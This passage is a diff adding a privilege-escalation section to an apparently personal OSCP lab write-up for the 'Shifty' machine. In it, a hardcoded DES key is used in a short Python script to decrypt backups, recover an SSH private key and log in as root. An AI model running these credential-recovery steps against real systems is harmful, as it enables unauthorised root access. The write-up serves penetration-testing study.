@@ -114,4 +114,52 @@ Successfully obtained shell.
 
 ![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Shifty/Shifty_2022.01.01_14h28m41s_006_.png)
 
+#### Privilege Escalation
 
+(Reference official walkthrough)
+
+There /opt/backups/backup.py file contains hardcoded key.
+
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Shifty/Shifty_2022.01.01_22h58m08s_007_.png)
+
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Shifty/Shifty_2022.01.01_23h08m17s_008_.png)
+
+Creating decrypt script file.
+
+```
+import sys
+from des import des, CBC, PAD_PKCS5
+
+k = des(b"87629ae8", CBC, b"\0\0\0\0\0\0\0\0", pad=None, padmode=PAD_PKCS5)
+with open('/opt/backups/data/{}'.format(sys.argv[1])) as f:
+    data = f.read()
+    print(k.decrypt(data))
+```
+
+We need des file to execute the decrypt script. 
+
+```
+cp /opt/backups/des.py /tmp/des.py
+```
+
+Decrypting backup files.
+
+```
+python decrypt.py 31328fa57f5c504df041f7f4f45498c766c0d12c33f78f33cff66bca
+```
+
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Shifty/Shifty_2022.01.01_23h17m59s_009_.png)
+
+It's a SSH private key.
+
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Shifty/Shifty_2022.01.01_23h21m20s_010_.png)
+
+Using this SSH key for authentication.
+
+```
+chmod 400 id_rsa
+
+ssh -i id_rsa root@192.168.134.59
+```
+
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Shifty/Shifty_2022.01.01_23h31m38s_011_.png)
